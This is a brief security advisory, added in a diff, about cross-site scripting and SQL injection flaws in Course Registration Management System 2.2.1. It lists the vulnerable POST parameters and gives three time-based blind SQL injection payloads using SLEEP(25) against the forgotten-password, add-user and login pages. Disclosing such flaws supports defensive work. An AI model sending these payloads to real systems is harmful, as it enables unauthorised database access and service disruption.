@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/63435/info
+
+Course Registration Management System is prone to multiple cross-site scripting and multiple SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Attackers can exploit these issues to execute arbitrary code in the context of the browser, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database; other attacks are also possible.
+
+Course Registration Management System 2.2.1 is vulnerable; other versions may also be affected. 
+
+
+http://example.com/add_user.php (POST -  params: work_tel, lastname, email, gmc_reg, job_title, firstname)
+
+http://example.com/login.php (POST -  params: username)
+
+http://example.com/auth.php (POST -  params: username)
+
+http://example.com/forgotten_password.php
+(POST - username)
+username='+(SELECT 1 FROM (SELECT SLEEP(25))A)+'
+
+http://example.com/add_user.php
+(POST - email)
+email='+(SELECT 1 FROM (SELECT SLEEP(25))A)+'
+
+http://example.com/login.php
+(POST - username)
+username='+(SELECT 1 FROM (SELECT SLEEP(25))A)+
